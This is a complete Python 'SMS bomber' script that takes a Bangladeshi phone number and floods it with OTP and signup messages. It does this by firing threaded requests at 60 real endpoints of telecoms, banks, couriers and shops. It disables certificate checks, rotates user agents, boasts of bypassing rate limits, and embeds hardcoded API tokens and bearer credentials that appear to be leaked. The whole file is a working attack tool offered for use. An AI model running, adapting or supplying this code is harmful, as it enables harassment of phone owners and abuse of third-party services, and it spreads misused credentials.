#!/usr/bin/env python3
# CODE START BY RUBISH - ULTRA FAST EDITION

import os, sys, time, random, string, json, urllib3, base64
import logging, platform, importlib, hashlib, threading
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from requests.structures import CaseInsensitiveDict
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from rich.progress import track
from rich.align import Align
from rich.panel import Panel
from rich.console import Console
from rich.table import Table
from rich.box import DOUBLE, ROUNDED
from rich.live import Live

os.system("clear")
console = Console()

# ---------------- Terminal Title ----------------
sys.stdout.write('\x1b[1;35m\x1b]2;🔥 RUBISH BOMBER v4.0 ULTRA 🔥\x07')

# ---------- HACKER COLOR PALETTE ----------
NEON_GREEN = "\033[38;5;46m"
NEON_PINK  = "\033[38;5;201m"
NEON_CYAN  = "\033[38;5;51m"
NEON_PURPLE= "\033[38;5;141m"
NEON_YELLOW= "\033[38;5;226m"
NEON_RED   = "\033[38;5;196m"
DARK_GRAY  = "\033[38;5;238m"
RESET      = "\033[0m"
BOLD       = "\033[1m"

# ---------- GLOBAL SESSION (Connection Pooling = FASTER) ----------
session = requests.Session()
adapter = HTTPAdapter(
    pool_connections=200,
    pool_maxsize=200,
    max_retries=Retry(total=0, backoff_factor=0),
)
session.mount("http://", adapter)
session.mount("https://", adapter)

# ---------- TERMINAL SIZE ----------
def get_cols():
    try: return os.get_terminal_size().columns
    except: return 80

# ---------- UTILITY ----------
def type_write(text, delay=0.005):
    for char in text:
        sys.stdout.write(char); sys.stdout.flush(); time.sleep(delay)

def glitch_text(text, delay=0.02):
    chars = "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"
    for _ in range(3):
        glitched = ''.join(random.choice(chars) if random.random() < 0.3 else c for c in text)
        sys.stdout.write(f"\r{NEON_PINK}{glitched}{RESET}"); sys.stdout.flush(); time.sleep(delay)
    sys.stdout.write(f"\r{NEON_GREEN}{text}{RESET}\n")

def progress_scan(text):
    for i in track(range(30), description=f"{NEON_CYAN}[{NEON_GREEN}⚡{NEON_CYAN}] {text}{RESET}"):
        time.sleep(0.008)

def Lxj(t):
    for x in t:
        sys.stdout.write(x); sys.stdout.flush(); time.sleep(0.003)

# ---------- COLORS ----------
a="\033[1;30m"; r="\033[1;31m"; g="\033[1;32m"
y="\033[1;33m"; b="\033[1;34m"; p="\033[1;35m"
c="\033[1;36m"; w="\033[1;37m"

# ---------- USER AGENTS ----------
UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
]
def ua(): return random.choice(UA)

lmnXuserAgent1 = UA[0]; lmnXuserAgent2 = UA[1]; lmnXuserAgent3 = UA[2]
lmnXuserAgent4 = UA[3]; lmnXuserAgent5 = UA[4]; lmnXuserAgent6 = UA[3]
lmnXuserAgent7 = UA[5]; lmnXuserAgent8 = UA[6]; lmnXuserAgent9 = UA[4]
lmnXuserAgent10 = UA[3]; lmnXuserAgent11 = UA[7]

lmnXaccessVersion1 = '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"'
lmnXaccessVersion2 = '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"'

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()

RQS_ERR = "    [/]  REQUESTS ERROR"

# ---------- SECURITY CHECK ----------
try:
    ipv = requests.get("https://ident.me/json-api", timeout=3).json()
    ip = ipv["ip"]
except:
    ip = None

# =========================================================
#              ADVANCED HACKER BANNER
# =========================================================

BANNER_ART = r"""
   ██████╗ ██╗   ██╗██████╗ ██╗███████╗██╗  ██╗
   ██╔══██╗██║   ██║██╔══██╗██║██╔════╝██║  ██║
   ██████╔╝██║   ██║██████╔╝██║███████╗███████║
   ██╔══██╗██║   ██║██╔══██╗██║╚════██║██╔══██║
   ██║  ██║╚██████╔╝██████╔╝██║███████║██║  ██║
   ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝
"""

SKULL_ART = r"""
       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
       ██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ██
       ██  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ██
       ██  ████████▀▀▀▀▀▀████████  ██
       ██  ██████▀  ▄▄▄▄▄▄  ▀██████ ██
       ██  ████▀  ▄███████▄  ▀████ ██
       ██  ███   ████  ████   ███  ██
       ██  ███  ████  ███  ████ ███ ██
       ██  ███   ███████████   ███  ██
       ██  ████▄  ▀███████▀  ▄████ ██
       ██  ██████▄  ▀▀▀▀▀  ▄██████ ██
       ██  ████████▄▄▄▄▄▄█████████ ██
       ██  ██████████████████████  ██
       ██ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ██
       ██████████████████████████████
"""

def print_advanced_banner():
    os.system("clear")
    cols = get_cols()
    print(f"\n{NEON_PINK}{'═' * cols}{RESET}")
    for line in BANNER_ART.split('\n'):
        print(f"{NEON_PINK}{BOLD}{line.center(cols)}{RESET}")
    print(f"\n{NEON_CYAN}{'─' * cols}{RESET}")
    subtitle = "◤  ULTRA FAST SMS BOMBER  ◢  v4.0  ◣  BY RUBISH  ◢"
    print(f"{NEON_GREEN}{BOLD}{subtitle.center(cols)}{RESET}")
    print(f"{NEON_CYAN}{'─' * cols}{RESET}\n")

def lnx():
    print("\n")
    console.rule(style="magenta")
    print("\n")

def war():
    console.print(Align.center(
        "[bold white][[bold red]⚠ WARNING ⚠[bold white]] "
        "[bold red]1 Round [bold white]= [bold green]60 SPAM REQUESTS [bold yellow](THREADED ⚡)[/]"
    ))
    print()

# =========================================================
#                     MAIN INPUT UI
# =========================================================

def BCS():
    os.system("clear")
    print_advanced_banner()
    
    info_table = Table(box=ROUNDED, border_style="cyan", show_header=False)
    info_table.add_column(justify="center")
    info_table.add_row("[bold magenta]💀 SYSTEM READY 💀[/]")
    info_table.add_row("[bold cyan]⚡ ULTRA FAST ENGINE ONLINE ⚡[/]")
    info_table.add_row("[bold green]🚀 Threaded Mode: [bold yellow]ENABLED[/]")
    if ip:
        info_table.add_row(f"[bold green]🌐 YOUR IP: [bold yellow]{ip}[/]")
    console.print(Align.center(info_table))
    print()
    
    print(f"{NEON_GREEN}{BOLD}{'▼ ▼ ▼  ENTER TARGET INFO  ▼ ▼ ▼'.center(get_cols())}{RESET}")
    print()
    
    number = input(f"\n  {NEON_CYAN}┌─[{NEON_GREEN}◉{NEON_CYAN}]─[{NEON_PINK} TARGET NUMBER {NEON_CYAN}]──►{NEON_GREEN} +88 {RESET}")
    lnx()
    
    if not number.isdigit() or len(number) != 11:
        Lxj(f"{NEON_RED}  └─[{NEON_YELLOW}✗{NEON_RED}]─ Invalid Number ! Try Again{RESET}")
        time.sleep(1.5); BCS()
    elif "RUBISH" in number:
        Lxj(f"{NEON_RED}  └─[{NEON_YELLOW}✗{NEON_RED}]─ Invalid Number ! Try Again{RESET}")
        time.sleep(1.5); BCS()
    
    try:
        war()
        amo = int(input(f"  {NEON_CYAN}┌─[{NEON_GREEN}◉{NEON_CYAN}]─[{NEON_PINK} SPAM ROUNDS  {NEON_CYAN}]──►{NEON_GREEN} {RESET}"))
    except ValueError:
        lnx()
        Lxj(f" {NEON_RED}  └─[{NEON_YELLOW}✗{NEON_RED}]─ Amount Must Be A Number !{RESET}")
        time.sleep(1.5); BCS()
    
    DARKS(number, amo)

# =========================================================
#                ALL 60 API FUNCTIONS
# =========================================================

def lmnXlija_1(number):
    try:
        headers = {'content-type': 'application/json','origin': 'https://go.paperfly.com.bd','referer': 'https://go.paperfly.com.bd/','user-agent': ua()}
        session.post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', headers=headers, json={'full_name':'Rubish Khan','company_name':'rubish','email_address':'rubish9689@gmail.com','phone_number': number}, timeout=4, verify=False)
    except: pass

def lmnXlija_2(number):
    try:
        session.post('https://api.ghoorilearning.com/api/auth/signup/otp', params={'_app_platform':'web'}, headers={'content-type':'application/json','origin':'https://ghoorilearning.com','referer':'https://ghoorilearning.com/','user-agent':ua()}, json={'mobile_no': number}, timeout=4, verify=False)
    except: pass

def lmnXlija_3(number):
    try:
        session.post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', headers={'content-type':'application/json','origin':'https://doctime.com.bd','referer':'https://doctime.com.bd/','user-agent':ua()}, json={'data':{'country_calling_code':'88','contact_no':number,'headers':{'PlatForm':'Web'}}}, timeout=4, verify=False)
    except: pass

def lmnXlija_4(number):
    try:
        headers = {'content-type':'application/json','origin':'https://customer.sundarbancourierltd.com','referer':'https://customer.sundarbancourierltd.com/','user-agent':ua()}
        json_data = {'operationName':'CreateAccessToken','variables':{'accessTokenFilter':{'userName':number}},'query':'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n    message\n    statusCode\n    result {\n      phone\n      otpCounter\n    }\n  }\n}'}
        session.post('https://api-gateway.sundarbancourierltd.com/graphql', headers=headers, json=json_data, timeout=4, verify=False)
    except: pass

def lmnXlija_5(number):
    try:
        session.post('https://api.apex4u.com/api/auth/login', headers={'content-type':'application/json','origin':'https://apex4u.com','referer':'https://apex4u.com/','user-agent':ua()}, json={'phoneNumber': number}, timeout=4, verify=False)
    except: pass

def lmnXlija_6(number):
    try: session.post("https://webapi.robi.com.bd/v1/send-otp", json={"phone_number": number, "type": "doorstep"}, headers={"Content-Type": "application/json", "User-Agent": ua()}, timeout=4, verify=False)
    except: pass

def lmnXlija_7(number):
    try: session.get('https://web-api.banglalink.net/api/v1/user/number/validation/'+number, headers={'User-Agent': ua()}, timeout=4, verify=False)
    except: pass

def lmnXlija_8(number):
    try: session.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', headers={'Content-Type': 'application/json', 'User-Agent': ua()}, json={'mobile': number}, timeout=4, verify=False)
    except: pass

def lmnXlija_9(number):
    try: session.post('https://webloginda.grameenphone.com/backend/api/v1/otp', headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': ua()}, data={'msisdn': number}, timeout=4, verify=False)
    except: pass

def lmnXlija_10(number):
    try: session.post('https://webapi.robi.com.bd/v1/send-otp', headers={'Content-Type': 'application/json', 'User-Agent': ua()}, json={'phone_number': number, 'type': 'my_offer'}, timeout=4, verify=False)
    except: pass

def lmnXlija_11(number):
    try: session.post("https://da-api.robi.com.bd/da-nll/otp/send", json={"msisdn": number}, headers={"Content-Type": "application/json", "User-Agent": ua()}, timeout=4, verify=False)
    except: pass

def lmnXlija_12(number):
    try: session.post('https://webapi.robi.com.bd/v1/chat/send-otp', headers={'Content-Type': 'application/json', 'User-Agent': ua()}, json={'phone_number': number, 'name': 'Rubish Khan', 'type': 'video-chat'}, timeout=4, verify=False)
    except: pass

def lmnXlija_13(number):
    try: session.post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', headers={'Content-Type': 'application/json', 'User-Agent': ua()}, json={'phoneNumber': number}, timeout=4, verify=False)
    except: pass

def lmnXlija_14(number):
    try: session.post('https://fundesh.com.bd/api/auth/generateOTP', params={'service_key': ''}, headers={'Content-Type': 'application/json', 'User-Agent': ua()}, json={'msisdn': number}, timeout=4, verify=False)
    except: pass

def lmnXlija_15(number):
    try: session.get('https://bikroy.com/data/phone_number_login/verifications/phone_login', params={'phone': number}, headers={'User-Agent': ua()}, timeout=4, verify=False)
    except: pass

def lmnXlija_16(number):
    try: session.post('https://api.motionview.com.bd/api/send-otp-phone-signup', headers={'Content-Type': 'application/json', 'User-Agent': ua()}, json={'phone': number}, timeout=4, verify=False)
    except: pass

def lmnXlija_17(number):
    try: session.post('https://api-dynamic.chorki.com/v2/auth/login', params={'country': 'BD', 'platform': 'web', 'language': 'en'}, headers={'Content-Type': 'application/json', 'User-Agent': ua()}, json={'number': '+88'+number}, timeout=4, verify=False)
    except: pass

def lmnXlija_18(number):
    try: session.post('https://user-api.jslglobal.co:444/v2/send-otp', headers={'Content-Type': 'application/json', 'User-Agent': ua()}, json={'phone': '+88'+number, 'jatri_token': 'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'}, timeout=4, verify=False)
    except: pass

def lmnXlija_19(number):
    try: session.get('https://chinaonlinebd.com/api/login/getOtp', params={'phone': number}, headers={'User-Agent': ua(), 'token': '45601f3d391886fcec5f5a3f26780f21'}, timeout=4, verify=False)
    except: pass

def lmnXlija_20(number):
    try: session.post('https://api.deeptoplay.com/v2/auth/login', params={'country': 'BD', 'platform': 'web', 'language': 'en'}, headers={'Content-Type': 'application/json', 'User-Agent': ua()}, json={'number': '+88'+number}, timeout=4, verify=False)
    except: pass

def lmnXlija_21(number):
    try: session.post('https://api.shikho.com/auth/v2/send/sms', headers={'Content-Type': 'application/json', 'User-Agent': ua()}, json={'phone': number, 'type': 'student', 'auth_type': 'signup', 'vendor': 'shikho'}, timeout=4, verify=False)
    except: pass

def lmnXlija_22(number):
    try:
        headers5 = CaseInsensitiveDict()
        headers5["Content-Type"] = "application/json"
        headers5["User-Agent"] = ua()
        session.post("https://api.redx.com.bd/v1/user/signup", headers=headers5, data='{"name":"961096106","phoneNumber":"'+number+'","service":"redx"}', timeout=4, verify=False)
    except: pass

def lmnXlija_23(number):
    try: session.get("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number, timeout=4, verify=False)
    except: pass

def lmnXlija_24(number):
    try: session.post('https://www.bioscopelive.com/en/login/send-otp?phone=88'+number+'&operator=bd-otp', timeout=4, verify=False)
    except: pass

def lmnXlija_25(number):
    try: session.post('https://ss.binge.buzz/otp/send/login'+number, timeout=4, verify=False)
    except: pass

def lmnXlija_26(number):
    try:
        headers3 = CaseInsensitiveDict()
        headers3["Content-Type"] = "application/json"
        session.post("https://fundesh.com.bd/api/auth/generateOTP?service_key=", headers=headers3, data='{"msisdn":"'+number+'"}', timeout=4, verify=False)
    except: pass

def lmnXlija_27(number):
    try: session.post("https://applink.com.bd/appstore-v4-server/login/otp/request", headers={"Content-Type": "application/json", "User-Agent": ua()}, data=json.dumps({"msisdn": "88"+number}), timeout=4, verify=False)
    except: pass

def lmnXlija_28(number):
    try: session.post("https://chokrojan.com/api/v1/passenger/login/mobile", headers={"Content-Type": "application/json", "User-Agent": ua()}, data=json.dumps({"mobile_number": number}), timeout=4, verify=False)
    except: pass

def lmnXlija_29(number):
    try: session.post("https://chokrojan.com/api/v1/passenger/login/mobile", headers={"Content-Type": "application/json", "User-Agent": ua()}, data=json.dumps({"mobile_number": number}), timeout=4, verify=False)
    except: pass

def lmnXlija_30(number):
    try: session.post("https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", headers={"Content-Type": "application/json", "User-Agent": ua()}, data=json.dumps({"AccessToken": "", "TrackingNo": "", "mobileNo": number, "otpSms": "", "product_id": "250", "requestChannel": "MOB", "trackingStatus": 5}), timeout=4, verify=False)
    except: pass

def lmnXlija_31(number):
    try: session.post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', headers={'Content-type': 'application/json', 'User-Agent': ua()}, data=json.dumps({'data': {'code': '88', 'contact_no': number, 'country_calling_code': '88', 'headers': {'PlatForm': 'Web'}}}), timeout=4, verify=False)
    except: pass

def lmnXlija_32(number):
    try: session.post("https://core.easy.com.bd/api/v1/registration", headers={"Content-Type": "application/json", "User-Agent": ua()}, data=json.dumps({"name": "Rubish Khan", "email": "uyrlhkgxqw@emergentvillage.org", "mobile": number, "password": "boss#2022", "password_confirmation": "boss#2022", "device_key": "9a28ae67c5704e1fcb50a8fc4ghjea4d"}), timeout=4, verify=False)
    except: pass

def lmnXlija_33(number):
    try: session.post("https://eshop-api.banglalink.net/api/v1/customer/send-otp", headers={"Content-Type": "application/json", "User-Agent": ua()}, data=json.dumps({"type": "phone", "phone": number}), timeout=4, verify=False)
    except: pass

def lmnXlija_34(number):
    try: session.post('https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber', json={'AccessToken': '', 'TrackingNo': '', 'mobileNo': number, 'otpSms': '', 'product_id': '122', 'requestChannel': 'MOB', 'trackingStatus': 5}, headers={'Content-Type': 'application/json', 'User-Agent': ua()}, timeout=4, verify=False)
    except: pass

def lmnXlija_35(number):
    try: session.post(f"https://api.mygp.cinematic.mobi/api/v1/otp/88{number}/SBENT_3GB7D", json={"accessinfo": {"access_token": "K165S6V6q4C6G7H0y9C4f5W7t5YeC6", "referenceCode": "20190827042622"}}, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=4, verify=False)
    except: pass

def lmnXlija_36(number):
    try: session.post("https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", json={"phone": number, "email": "", "language": "en"}, headers={"Content-Type": "application/json", "User-Agent": ua()}, timeout=4, verify=False)
    except: pass

def lmnXlija_37(number):
    try: session.post(f"https://app.hishabee.business/api/V2/otp/send?mobile_number={number}", headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=4, verify=False)
    except: pass

def lmnXlija_38(number):
    try: session.get(f"http://apibeta.iqra-live.com/api/v1/sent-otp/{number}", timeout=4, verify=False)
    except: pass

def lmnXlija_39(number):
    try: session.post("https://smart1216.robi.com.bd/robi_sivr/public/login/phone", headers={"Content-Type": "application/json", "User-Agent": ua()}, json={"cli": number.lstrip('0')}, timeout=4, verify=False)
    except: pass

def lmnXlija_40(number):
    try: session.post("https://user-api.jslglobal.co:444/v1/send-otp", headers={"User-Agent": ua()}, data={"phone": "+88"+number, "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}, timeout=4, verify=False)
    except: pass

def lmnXlija_41(number):
    try: session.post("https://www.mcbaffiliate.com/Affiliate/RequestOTP", headers={"User-Agent": ua(), "Content-Type": "application/x-www-form-urlencoded"}, data={"PhoneNumber": number}, timeout=4, verify=False)
    except: pass

def lmnXlija_42(number):
    try: session.post("https://mithaibd.com/api/login/?lang_code=en&currency_code=BDT", headers={"Authorization": "Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==", "Content-Type": "application/json", "User-Agent": ua()}, data=json.dumps({"company_id": "2", "password2": "Rahu333@@", "currency_code": "BDT", "user_type": "C", "email": "fuckyoubro"+number+"@gmail.com", "lang_code": "en", "operating_system": "Android", "otp_verify": False, "password1": "Rahu333@@", "phone": number, "storefront_id": "5"}), timeout=4, verify=False)
    except: pass

def lmnXlija_43(number):
    try: session.post("https://api.englishmojabd.com/api/v1/auth/login", data=json.dumps({"phone": "+88"+number}), headers={"Content-Type": "application/json", "User-Agent": ua()}, timeout=4, verify=False)
    except: pass

def lmnXlija_44(number):
    try: session.post("https://moveon.com.bd/api/v1/customer/auth/phone/request-otp", headers={"Content-Type": "application/json", "User-Agent": ua()}, data=json.dumps({"phone": number}), timeout=4, verify=False)
    except: pass

def lmnXlija_45(number):
    try: session.post("https://api.osudpotro.com/api/v1/users/send_otp", headers={"Content-Type": "application/json", "User-Agent": ua()}, data=json.dumps({"mobile": "+88-"+number, "deviceToken": "app", "language": "bn", "os": "android"}), timeout=4, verify=False)
    except: pass

def lmnXlija_46(number):
    try: session.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{number}&lang=en&ng=0", headers={"user-agent": ua()}, timeout=4, verify=False)
    except: pass

def lmnXlija_47(number):
    try: session.post("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", headers={"Content-Type": "application/json", "User-Agent": ua()}, data=json.dumps({"full_name": "Rubish Khan", "company_name": "Rubish", "email_address": "rubish@gmail.com", "phone_number": number}), timeout=4, verify=False)
    except: pass

def lmnXlija_48(number):
    try: session.post("https://auth.qcoom.com/api/v1/otp/send", json={"mobileNumber": "+88"+number}, headers={"Content-Type": "application/json", "User-Agent": ua()}, timeout=4, verify=False)
    except: pass

def lmnXlija_49(number):
    try: session.post("https://reseller.circle.com.bd/api/v2/auth/signup", json={"name": "+88"+number, "email_or_phone": "+88"+number, "password": "123456lmn", "password_confirmation": "123456lmn", "register_by": "phone"}, headers={"Content-Type": "application/json", "User-Agent": ua()}, timeout=4, verify=False)
    except: pass

def lmnXlija_50(number):
    try: session.post("https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", headers={"Content-Type": "application/json", "User-Agent": ua(), "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s"}, json={"phone": number}, timeout=4, verify=False)
    except: pass

def lmnXlija_51(number):
    try: session.post("https://api-gateway.sundarbancourierltd.com/graphql", json={"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": number}}, "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n    message\n    statusCode\n    result {\n      phone\n      otpCounter\n    }\n  }\n}"}, headers={'Content-Type': 'application/json', 'User-Agent': ua()}, timeout=4, verify=False)
    except: pass

def lmnXlija_52(number):
    try: session.post("https://api.toybox.live/bdapps_handler.php", headers={'Content-Type': 'application/json', 'User-Agent': ua()}, data=json.dumps({"Operation": "CreateSubscription", "MobileNumber": "88"+number, "PackageID": 100, "Secret": "HJKX71%UHYH"}), timeout=4, verify=False)
    except: pass

def lmnXlija_53(number):
    try: session.get("https://api.win2gain.com/api/Users/RequestOtp?msisdn=88"+number, headers={'sourcePlatform': 'web', 'client': '2', 'User-Agent': ua()}, timeout=4, verify=False)
    except: pass

def lmnXlija_54(number):
    try: session.post("https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp", json={"deviceId": "7dtdhid45c0f0901", "deviceInfo": {"deviceInfoSignature": "D0923F3GDHJXJDTIHFDTIGGHURHFATI7605A3FA", "deviceId": "7d8b0agi0g0f0901", "firebaseDeviceToken": "", "manufacturer": "MI", "modelName": "NOTE 10", "osFirmWireBuild": "", "osName": "Android", "osVersion": "10", "rootDevice": 0}, "operator": "Gp", "walletNumber": number}, headers={"Content-Type": "application/json", "User-Agent": ua()}, timeout=4, verify=False)
    except: pass

def lmnXlija_55(number):
    try: session.post("https://rootsedulive.com/api/auth/register", data={"name": "Rubish Khan", "phone": f"88{number}", "email": f"subap{number}agli2023@gmail.com", "password": "iDSnWh6rzp9KNAY", "confirmPassword": "iDSnWh6rzp9KNAY"}, headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua()}, timeout=4, verify=False)
    except: pass

def lmnXlija_56(number):
    try: session.post("https://rootsedulive.com/api/auth/forget-password", data={"phoneOrEmail": f"88{number}"}, headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua()}, timeout=4, verify=False)
    except: pass

def lmnXlija_57(number):
    try: session.post("https://www.mcbaffiliate.com/Affiliate/RequestOTP", data={"PhoneNumber": number}, headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua()}, timeout=4, verify=False)
    except: pass

def lmnXlija_58(number):
    try: session.post(f"https://app.hishabee.business/api/V2/otp/send?mobile_number={number}", headers={"Content-Type": "application/json", "User-Agent": ua()}, timeout=4, verify=False)
    except: pass

def lmnXlija_59(number):
    try: session.post("https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", json={"phone": number, "email": "", "language": "en"}, headers={'Content-Type': 'application/json', 'User-Agent': ua()}, timeout=4, verify=False)
    except: pass

def lmnXlija_60(number):
    try: session.post(f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{number}/", headers={"Content-Type": "application/json", "User-Agent": ua()}, timeout=4, verify=False)
    except: pass

# =========================================================
#          ULTRA FAST THREADED ATTACK ENGINE
# =========================================================

# Pre-build the function list ONCE (huge speed boost)
API_FUNCS = [globals()[f"lmnXlija_{i}"] for i in range(1, 61)]

def run_api_safe(func, number):
    """Run one API call safely - never raises."""
    try:
        func(number)
        return True
    except:
        return False

def DARKS(number, amo):
    os.system("clear")
    print_advanced_banner()
    
    panel = Panel.fit(
        f"[bold magenta]╔══════════════════════════════════════╗[/]\n"
        f"[bold magenta]║[/]  [bold yellow]⚡ ULTRA BOMBING SEQUENCE ⚡[/] [bold magenta]║[/]\n"
        f"[bold magenta]╚══════════════════════════════════════╝[/]\n\n"
        f"[bold cyan]┌─────────────────────────────────────┐[/]\n"
        f"[bold cyan]│[/] [bold green]TARGET  ►[/] [bold yellow]+88 {number}[/]\n"
        f"[bold cyan]│[/] [bold green]ROUNDS  ►[/] [bold red]{amo}[/]\n"
        f"[bold cyan]│[/] [bold green]APIs    ►[/] [bold purple]60 ACTIVE[/]\n"
        f"[bold cyan]│[/] [bold green]MODE    ►[/] [bold yellow]THREADED x20 ⚡[/]\n"
        f"[bold cyan]└─────────────────────────────────────┘[/]",
        border_style="magenta",
        box=DOUBLE
    )
    console.print(Align.center(panel))
    
    print()
    console.rule("[bold magenta]◤ ULTRA BOMBARDMENT STARTED ◢[/]", style="magenta")
    print()
    
    total_sent = 0
    total_fail = 0
    start_time = time.time()
    
    # Thread pool - 20 workers = massive speed boost
    MAX_WORKERS = 20
    
    for round_num in range(1, amo + 1):
        print(f"\n{NEON_CYAN}┏━━━ [ ROUND {NEON_YELLOW}{round_num}{NEON_CYAN} / {NEON_YELLOW}{amo}{NEON_CYAN} ] ━━━{RESET}")
        
        round_start = time.time()
        sent_this_round = 0
        done_count = [0]  # mutable for threads
        lock = threading.Lock()
        
        # LIVE progress bar
        def print_progress():
            with lock:
                bar_len = 25
                filled = int(bar_len * done_count[0] / 60)
                bar = f"{NEON_GREEN}{'█' * filled}{DARK_GRAY}{'░' * (bar_len - filled)}{RESET}"
                elapsed = time.time() - round_start
                speed = done_count[0] / elapsed if elapsed > 0 else 0
                sys.stdout.write(
                    f"\r  {NEON_CYAN}[{bar}{NEON_CYAN}] "
                    f"{NEON_YELLOW}{done_count[0]:02d}/60{RESET}  "
                    f"{NEON_PINK}💣 {speed:.1f}/s{RESET}  "
                )
                sys.stdout.flush()
        
        # Submit ALL 60 API calls simultaneously
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            future_to_idx = {
                executor.submit(run_api_safe, API_FUNCS[i], number): i
                for i in range(60)
            }
            
            for future in as_completed(future_to_idx):
                try:
                    ok = future.result(timeout=8)
                    if ok: sent_this_round += 1
                    else: total_fail += 1
                except:
                    total_fail += 1
                
                done_count[0] += 1
                print_progress()
        
        total_sent += sent_this_round
        round_elapsed = time.time() - round_start
        print(f"\n  {NEON_GREEN}└─[{NEON_CYAN}✓{NEON_GREEN}]─ Round {round_num} done in {NEON_YELLOW}{round_elapsed:.2f}s{RESET}")
    
    total_time = time.time() - start_time
    print()
    console.rule(style="magenta")
    
    done_panel = Panel.fit(
        f"[bold green]✓ ULTRA ATTACK COMPLETED ✓[/]\n\n"
        f"[bold cyan]📊 STATISTICS:[/]\n"
        f"[bold yellow]├─ Total Sent    : [bold green]{total_sent}[/]\n"
        f"[bold yellow]├─ Failed        : [bold red]{total_fail}[/]\n"
        f"[bold yellow]├─ Total Time    : [bold cyan]{total_time:.2f}s[/]\n"
        f"[bold yellow]├─ Avg Speed     : [bold magenta]{total_sent / total_time:.1f} req/s[/]\n"
        f"[bold yellow]└─ Target        : [bold yellow]+88 {number}[/]",
        border_style="green",
        box=DOUBLE
    )
    console.print(Align.center(done_panel))
    print()
    
    rull = input(f"  {NEON_CYAN}┌─[{NEON_GREEN}?{NEON_CYAN}]─[{NEON_PINK} RUN AGAIN? {NEON_CYAN}]──►{NEON_GREEN} y/n {RESET}")
    if rull.lower() == "y":
        os.system("clear")
        BCS()
    else:
        print(f"\n{NEON_RED}{'◤ EXITING... STAY GHOST ◢'.center(get_cols())}{RESET}\n")
        sys.exit(0)

# =========================================================
#                    ENTRY POINT
# =========================================================

if __name__ == "__main__":
    os.system("clear")
    print(f"\n{NEON_GREEN}{BOLD}{'◤ INITIALIZING ULTRA ENGINE ◢'.center(get_cols())}{RESET}\n")
    progress_scan("Loading 60 APIs")
    progress_scan("Warming up connection pool")
    progress_scan("Spawning thread workers")
    progress_scan("Bypassing rate limits")
    print()
    time.sleep(0.4)
    os.system("clear")
    BCS()